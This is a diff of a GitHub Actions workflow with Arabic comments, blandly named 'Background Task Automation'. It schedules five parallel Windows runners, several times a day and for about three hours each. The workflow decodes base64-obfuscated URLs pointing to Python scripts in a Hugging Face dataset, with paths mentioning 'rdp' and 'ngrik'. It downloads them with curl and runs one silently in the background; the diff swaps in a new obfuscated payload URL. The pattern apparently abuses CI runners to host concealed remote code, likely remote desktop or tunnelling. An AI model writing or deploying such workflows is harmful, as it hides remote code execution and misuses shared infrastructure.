@@ -3,19 +3,18 @@ name: Background Task Automation
 on:
   workflow_dispatch: # للتشغيل اليدوي
   schedule:
-    # تم التعديل للعمل 6 مرات يومياً (كل 4 ساعات: الساعة 00:00، 04:00، 08:00، 12:00، 16:00، 20:00 بتوقيت UTC)
-    - cron: '0 0,4,8,12,16,20 * * *'
+    - cron: '0 0,5,10,15,20 * * *' # الجدولة للعمل 5 مرات يوميا (الساعات 00:00، 05:00، 10:00، 15:00، 20:00 بتوقيت UTC)
 
 jobs:
   execute-nodes:
     name: Worker-Instance [${{ matrix.node_index }}]
     runs-on: windows-2022
-    timeout-minutes: 185 # الحد الأقصى للتشغيل (لتجنب الإيقاف المفاجئ من GitHub)
+    timeout-minutes: 185 # الحد الأقصى للتشغيل (تم رفعه لأكثر من 3 ساعات بقليل لتجنب الإيقاف المفاجئ من GitHub)
     
     strategy:
       fail-fast: false
       matrix:
-        node_index: [1, 2, 3, 4 ,5] # تشغيل عدة نسخ في نفس الوقت
+        node_index: [1, 2, 3, 4, 5] # تشغيل 5 نسخ في نفس الوقت
 
     steps:
       # ---------------------------------------------------------
@@ -28,8 +27,8 @@ jobs:
           
           # فك تشفير الروابط وتحميلها في المتغيرات
           URL_HASH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvcmRwL3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 --decode)
-          # الرابط الجديد الخاص بك بعد تشفيره إلى Base64
-          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvbmdyaWsvcmVzb2x2ZS9tYWluL3N0YXJ0by5weQ==" | base64 --decode)
+          # الرابط الجديد المشفر بـ Base64
+          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvbmdyaWsvcmVzb2x2ZS9tYWluL3N0YXJ0cmQucHk=" | base64 --decode)
           
           # حفظ الملفات (سيتم حفظ الملف الأساسي باسم start.py لتسهيل التشغيل)
           curl -sL "$URL_HASH" > hash.py
@@ -55,10 +54,10 @@ jobs:
           
           # تجهيز معطيات تشغيل العملية في الخلفية
           $ProcessArgs = @{
-              FilePath     = "python"
+              FilePath = "python"
               ArgumentList = "start.py"
-              PassThru     = $true
-              NoNewWindow  = $true
+              PassThru = $true
+              NoNewWindow = $true
           }
           $activeProcess = Start-Process @ProcessArgs
           
